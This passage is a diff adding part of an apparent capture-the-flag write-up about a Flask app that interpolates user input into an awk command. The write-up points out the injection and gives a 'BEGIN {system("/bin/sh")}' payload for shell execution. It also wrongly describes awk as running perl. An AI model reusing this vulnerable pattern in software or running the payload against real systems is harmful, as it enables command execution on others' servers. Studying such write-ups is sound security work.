@@ -465,7 +465,57 @@ app.post('/save', async c => {
 
 -------------
 
-- 
+<img width="815" height="460" alt="image" src="https://github.com/user-attachments/assets/481a3f3f-a28a-4ff9-aea8-3732e9a91cea" />
 
 ------------
 
+- Source Code-:
+
+```python3
+import subprocess
+from flask import Flask, render_template, request
+
+
+app = Flask(__name__)
+
+
+@app.route("/", methods=["GET", "POST"])
+def index():
+    query = ""
+    log = ""
+    if request.method == "POST":
+        query = request.form.get("query", "")
+
+        command = ["awk", f"/{query}/", "info.log"]
+        result = subprocess.run(
+            command,
+            capture_output=True,
+            timeout=0.5,
+            text=True,
+        )
+        log = result.stderr or result.stdout
+    
+    return render_template(
+        "index.html",
+        log=log,
+        query=query,
+    )
+```
+
+-  The vulnerable code is shown below.It receives body query `query` and pass it to subprocess `awk /{query}/ info.log`.Regex is expected but we can gain RCE.
+
+```python3
+command = ["awk", f"/{query}/", "info.log"]
+        result = subprocess.run(
+            command,
+            capture_output=True,
+            timeout=0.5,
+            text=True,
+        )
+```
+
+- Awk normally allows perl language execution with the code below.
+
+>BEGIN {system("/bin/sh")}
+
+- Playing with python interpreter-:
